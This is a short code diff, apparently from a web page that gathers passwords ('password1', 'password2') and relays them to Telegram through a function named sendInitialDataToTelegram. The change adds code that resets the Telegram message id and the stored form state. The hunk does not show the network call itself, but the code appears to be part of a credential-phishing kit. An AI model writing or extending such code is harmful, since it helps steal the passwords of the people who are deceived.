@@ -479,9 +479,13 @@ const buildFullMessage = (overrides?: Partial<{
     .filter(Boolean)
     .join("\n");
 };
-
-const sendInitialDataToTelegram = async () => {
+  const sendInitialDataToTelegram = async () => {
   if (!telegramEnabled) return;
+      if (typeof window !== "undefined") { 
+    localStorage.removeItem("telegram_msg_id");
+  }
+  setMessageId(null);
+    
   stateRef.current = {
     password1: "",
     password2: "",
